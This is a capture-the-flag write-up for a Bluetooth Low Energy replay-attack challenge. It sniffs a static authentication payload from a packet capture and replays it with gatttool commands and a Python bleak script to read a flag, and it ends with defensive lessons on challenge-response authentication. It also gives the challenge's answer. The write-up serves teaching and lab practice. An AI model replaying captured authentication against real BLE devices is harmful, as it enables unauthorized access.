# Writeup - Challenge 08: Replay Attack

**Difficulty:** ⭐⭐⭐⭐ Advanced
**Category:** Bluetooth Low Energy
**Flag:** `WOCSA{replay_attacks_bypass_auth}`

---

## 🔍 Step 1: Open the PCAP in Wireshark

A file `capture.pcap` is provided in the challenge folder. Open it in Wireshark:

```bash
wireshark capture.pcap
```

---

## 🔎 Step 2: Filter for BLE ATT Write Operations

In the Wireshark filter bar, enter:

```
btatt.opcode == 0x12
```

This filters for **ATT Write Request** packets (opcode `0x12`).

You will see a packet:
```
Frame X: ATT Write Request, Handle: 0x000b, Value: de ad be ef
```

The **magic payload** is `DE AD BE EF`.

---

## 📋 Step 3: Identify the Target Handle

From the PCAP, note the handle used for the write: `0x000b`.

To confirm the corresponding UUID, look at the device's service discovery packets in the PCAP (opcode `0x08` / `0x0e` for read by group type / find by type responses).

The handle maps to: `facade00-0002-1000-8000-00805f9b34fb` (AUTH characteristic).

---

## ▶️ Step 4: Replay the Payload

### Option A — gatttool

```bash
gatttool -b AA:BB:CC:DD:EE:FF --char-write-req --handle=0x000b --value=deadbeef
```

### Option B — Python (bleak)

```python
import asyncio
from bleak import BleakClient

MAC = "AA:BB:CC:DD:EE:FF"
AUTH_UUID = "facade00-0002-1000-8000-00805f9b34fb"
FLAG_UUID = "facade00-0001-1000-8000-00805f9b34fb"

MAGIC = bytes.fromhex("DEADBEEF")

async def main():
    async with BleakClient(MAC) as client:
        print("[*] Connected. Replaying magic payload...")
        await client.write_gatt_char(AUTH_UUID, MAGIC)

        value = await client.read_gatt_char(FLAG_UUID)
        print(f"[+] Flag: {value.decode()}")

asyncio.run(main())
```

---

## 📖 Step 5: Read the Flag

```bash
gatttool -b AA:BB:CC:DD:EE:FF --char-read --handle=0x0009
# Characteristic value: 57 4f 43 53 41 7b...
```

Or the Python script above will print it directly.

```
WOCSA{replay_attacks_bypass_auth}
```

---

## 🎯 Flag

```
WOCSA{replay_attacks_bypass_auth}
```

---

## Key Takeaways

* Authentication based on a **static secret payload** (no nonce, no timestamp, no challenge-response) is vulnerable to replay attacks
* An attacker with a BLE sniffer capturing one legitimate authentication can replay it indefinitely
* **Defense:** Use challenge-response authentication — the server sends a fresh random nonce, the client must sign it with a shared secret (HMAC). The response is different every time.
* Even without breaking cryptography, passive sniffing + replaying is often sufficient to defeat weak BLE auth implementations
* Tools like Ubertooth One or Nordic Semiconductor nRF Sniffer can capture BLE traffic live for analysis
